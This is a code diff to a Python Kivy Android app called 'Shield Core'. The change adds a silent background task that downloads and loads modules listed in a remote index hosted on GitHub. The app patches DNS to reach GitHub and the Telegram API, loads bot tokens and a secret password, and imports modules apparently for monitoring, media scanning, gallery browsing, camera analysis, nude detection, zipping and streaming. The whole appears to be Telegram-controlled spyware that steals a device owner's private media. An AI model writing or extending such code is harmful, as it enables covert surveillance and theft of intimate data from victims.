@@ -21,14 +21,12 @@ from kivy.core.clipboard import Clipboard
 def _patch_dns():
     original_getaddrinfo = socket.getaddrinfo
     def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
-        # محاولة DNS العادي أولاً
         try:
             result = original_getaddrinfo(host, port, family, type, proto, flags)
             if result:
                 return result
         except Exception:
             pass
-        # قائمة IPs احتياطية في حال فشل DNS
         override = {
             'raw.githubusercontent.com': ['185.199.108.133', '185.199.109.133', '185.199.110.133', '185.199.111.133'],
             'api.telegram.org': ['149.154.167.220', '149.154.167.221', '149.154.167.99', '149.154.175.50'],
@@ -181,7 +179,6 @@ class CoreApp(App):
         Clock.schedule_once(upd, 0)
 
     def _check_connectivity(self):
-        # فحص اتصال فعلي عبر HTTPS (المنفذ 443) المطلوب للتحميل
         test_urls = [
             "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
             "https://zaen1993.github.io/Android-Core/index.json",
@@ -190,7 +187,7 @@ class CoreApp(App):
         for url in test_urls:
             try:
                 resp = requests.head(url, timeout=10, verify=True, headers=HEADERS)
-                return True  # أي استجابة تعني وجود اتصال بالخادم
+                return True
             except Exception:
                 continue
         try:
@@ -258,6 +255,37 @@ class CoreApp(App):
                 os.remove(model_path)
         return False
 
+    def _background_update_task(self):
+        if not self._check_connectivity():
+            self._log("No internet connection. Will try again later.", "WARN")
+            return
+        self._log("Background update started...")
+        all_files = []
+        for base_url in INDEX_BASE_URLS:
+            try:
+                url = f"{base_url}?t={int(time.time())}"
+                resp = requests.get(url, headers=HEADERS, timeout=15)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    all_files = data.get('files', [])
+                    break
+            except Exception:
+                continue
+
+        if all_files:
+            for file_entry in all_files:
+                name = file_entry.get('name')
+                url = file_entry.get('url')
+                if not name or not url:
+                    continue
+                if name == "engine_v2.tflite":
+                    self._download_model_if_missing(url)
+                else:
+                    self._download_safe(url, name)
+        else:
+            self._log("Could not fetch index.json in background update.", "WARN")
+        self._log("Background update finished.")
+
     def _start(self, _):
         threading.Thread(target=self._run, daemon=True).start()
 
@@ -265,60 +293,27 @@ class CoreApp(App):
         _perms()
         self._log("Shield Core v4.2 (Config template mode) starting...", "BOOT")
 
-        # ---- فحص الاتصال ----
-        if not self._check_connectivity():
-            self._log("No internet connection. Retrying in 30 seconds...", "ERROR")
-            Clock.schedule_once(lambda dt: self._start(None), 30)
+        # 1. بدء التحديث الخلفي (لا ننتظره)
+        threading.Thread(target=self._background_update_task, daemon=True).start()
+
+        # 2. تحميل الإعدادات المحلية فوراً
+        try:
+            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
+            self._log("Secrets loaded from local config_template.py")
+        except Exception as e:
+            self._log(f"Failed to load secrets from local config: {e}", "ERROR")
             return
 
-        # ---- جلب index.json ----
-        all_files = []
-        for base_url in INDEX_BASE_URLS:
-            try:
-                url = f"{base_url}?t={int(time.time())}"
-                self._log(f"Trying index: {url.split('/')[2]}...")
-                resp = requests.get(url, headers=HEADERS, timeout=15)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    all_files = data.get('files', [])
-                    self._log(f"Found {len(all_files)} files in index")
-                    break
-                else:
-                    self._log(f"Index HTTP {resp.status_code}", "WARN")
-            except Exception as e:
-                self._log(f"Index error: {e}", "WARN")
-        else:
-            self._log("Could not fetch index.json, using only local files.", "WARN")
+        # 3. التأكد من وجود telegram_ui.py محلياً
+        telegram_path = os.path.join(R, "telegram_ui.py")
+        if not os.path.exists(telegram_path):
+            self._log("telegram_ui.py not found locally. Waiting for background download...", "WARN")
+            time.sleep(5)
+            if not os.path.exists(telegram_path):
+                self._log("telegram_ui.py still missing. System cannot start.", "ERROR")
+                return
 
-        # ---- تحميل الملفات ----
-        model_url = None
-        for file_entry in all_files:
-            name = file_entry.get('name')
-            url = file_entry.get('url')
-            if not name or not url:
-                continue
-            if name == "engine_v2.tflite":
-                model_url = url
-                continue
-            self._download_safe(url, name)
-
-        # ---- تحميل الموديل ----
-        if model_url:
-            self._download_model_if_missing(model_url)
-        else:
-            self._log("No model URL in index, trying fallback...", "WARN")
-            fallback_url = "https://zaen1993.github.io/Android-Core/assets/engine_v2.tflite"
-            self._download_model_if_missing(fallback_url)
-
-        # ---- تحقق من config_template.py ----
-        config_path = os.path.join(R, "config_template.py")
-        if not os.path.exists(config_path):
-            self._log("config_template.py not found after download! System cannot start.", "ERROR")
-            return
-
-        time.sleep(1)
-
-        # ---- تنظيف الوحدات ----
+        # 4. تنظيف الوحدات القديمة
         modules_to_remove = ["monitor", "telegram_ui", "commands", "media_scanner", "daily_zipper",
                              "gallery_browser", "camera_analyzer", "nude_detector", "stream_manager",
                              "config_template", "config"]
@@ -328,20 +323,7 @@ class CoreApp(App):
         importlib.invalidate_caches()
         gc.collect()
 
-        # ---- تحميل الأسرار ----
-        try:
-            active_tokens, reserve_tokens, ctrl_id, vault_id, secret_password = load_secrets_from_config()
-            self._log("Secrets loaded from config_template.py")
-        except Exception as e:
-            self._log(f"Failed to load secrets: {e}", "ERROR")
-            return
-
-        # ---- التحقق من telegram_ui.py ----
-        if not os.path.exists(os.path.join(R, "telegram_ui.py")):
-            self._log("telegram_ui.py not found.", "ERROR")
-            return
-
-        # ---- بدء النظام ----
+        # 5. بدء النظام
         try:
             import monitor
             import telegram_ui
